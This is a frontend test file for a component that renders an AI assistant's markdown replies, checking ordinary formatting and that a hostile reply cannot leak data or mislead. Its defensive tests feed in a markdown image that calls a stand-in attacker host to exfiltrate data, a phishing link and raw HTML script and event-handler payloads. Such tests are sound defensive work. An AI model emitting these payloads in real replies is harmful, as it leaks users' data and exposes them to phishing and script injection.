import { describe, expect, it } from 'vitest'
import { screen } from '@testing-library/react'
import AssistantMarkdown from './AssistantMarkdown'
import { renderWithProviders } from '../test/renderWithProviders'

const show = (markdown: string) =>
  renderWithProviders(<AssistantMarkdown>{markdown}</AssistantMarkdown>)

describe('AssistantMarkdown', () => {
  it('renders emphasis, lists and tables', () => {
    show('**Oyster** is fine\n\n- one\n- two\n\n| A | B |\n|---|---|\n| 1 | 2 |')

    expect(screen.getByText('Oyster').tagName).toBe('STRONG')
    expect(screen.getAllByRole('listitem')).toHaveLength(2)
    expect(screen.getByRole('table')).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: 'A' })).toBeInTheDocument()
  })

  // The reply is untrusted. These are the ways rendering it could send data away or mislead.
  describe('is safe against a hostile reply', () => {
    it('never loads an image (that would send data to its address)', () => {
      const { container } = show('![secret](https://evil.example/steal?d=batch-names)')

      expect(container.querySelector('img')).toBeNull()
      expect(container.innerHTML).not.toContain('evil.example')
      expect(screen.getByText('secret')).toBeInTheDocument() // the alt text still shows
    })

    it('does not turn text into a link', () => {
      const { container } = show('[Log in again](https://evil.example/phish)')

      expect(screen.queryByRole('link')).toBeNull()
      expect(container.innerHTML).not.toContain('evil.example')
      expect(screen.getByText('Log in again')).toBeInTheDocument()
    })

    it('drops raw HTML', () => {
      const { container } = show(
        'before <script>alert(1)</script><img src=x onerror="alert(2)"><b onclick="x()">bold</b> after',
      )

      expect(container.querySelector('script')).toBeNull()
      expect(container.querySelector('img')).toBeNull()
      expect(container.querySelector('[onclick]')).toBeNull()
      expect(container.innerHTML).not.toContain('onerror')
    })
  })
})
